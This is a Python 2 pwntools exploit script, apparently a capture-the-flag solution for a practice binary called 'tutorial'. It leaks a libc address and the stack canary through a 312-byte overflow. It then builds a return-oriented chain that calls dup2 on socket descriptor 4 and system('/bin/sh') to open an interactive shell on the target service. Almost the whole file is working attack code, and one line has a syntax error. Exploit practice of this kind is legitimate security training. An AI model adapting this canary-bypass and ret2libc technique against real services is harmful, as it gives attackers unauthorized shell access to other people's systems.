#!/usr/bin/env python

from pwn import *
context(arch="amd64",os="linux")

binary = ELF("tutorial",checksec=False)
debug = False

if debug:
    exp = remote('SERVER', PORT)
    libc = ELF('LIBC',=False)
else:
    exp = remote('127.0.0.1', 1337)
    #exp = process("BINARY")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    puts_offset = libc.symbols["puts"]

def manual():
	exp.sendlineafter(">","1")
	ref_addr = exp.recvline().split(":")[-1]
	print ref_addr.split()
	return ref_addr

def practice(payload="A"*312,pwn=False):
	exp.sendlineafter(">","2")
	exp.recvuntil(">")
	exp.send(payload)
	if pwn:
		exp.interactive()
	else:
		return exp.recv()

# gdb.attach(exp,'''set follow-fork-mode child
# b *0x0000000000400F8C
# ''')

puts_addr = int(manual(),16) + 0x500 # Pastikan debug dulu untuk mengetahui address nya yang asil yaa !!
libc.address = puts_addr - puts_offset
system_addr = libc.symbols["system"]
bin_sh_addr = libc.search("/bin/sh").next()
dup_addr = libc.symbols["dup2"]

canary = u64(practice()[312:320])

pop_rdi = 0x00000000004012e3
pop_rsi = libc.address + 0x00000000000202e8

log.info("Base address 0x{:x}".format(libc.address))
log.info("Canary : 0x{:x}".format(canary))
log.info(" /bin/sh Address 0x{:x}".format(bin_sh_addr))
log.info(" system Address 0x{:x}".format(system_addr))
log.info(" dup2 Address 0x{:x}".format(dup_addr))

# stdin
payload = ""
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(dup_addr)

# stdout
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi)
payload += p64(1)
payload += p64(dup_addr)

# stderr
# payload += p64(pop_rdi)
# payload += p64(4)
# payload += p64(pop_rsi)
# payload += p64(2)
# payload += p64(dup_addr)

# call /bin/sh

payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

#payload = "A" * 312 + p64(canary) + "A" * 8 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)

final_payload = "A" * 312 + p64(canary) + "A" * 8 + payload
practice(final_payload,pwn=True)